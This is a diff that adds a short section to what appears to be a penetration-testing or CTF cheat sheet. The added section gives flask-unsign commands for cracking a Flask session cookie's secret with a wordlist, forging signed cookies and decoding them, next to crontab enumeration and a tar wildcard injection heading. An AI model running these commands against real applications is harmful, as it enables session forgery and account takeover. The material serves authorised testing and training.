@@ -499,6 +499,16 @@ cat /etc/crontab
 cd /etc/cron.d
 ```
 
+# Flask session cookie manipulation
+
+## Flask session cookie signing / unsigning / decoding
+
+```bash
+flask-unsign --unsign --wordlist <WORDLIST> --cookie '<COOKIE>'
+flask-unsign --sign --cookie "<COOKIE>" --secret '<SECRET>'
+flask-unsign --decode --cookie '<COOKIE>''
+```
+
 ## Tar Wildcard Injection
 
 ```bash
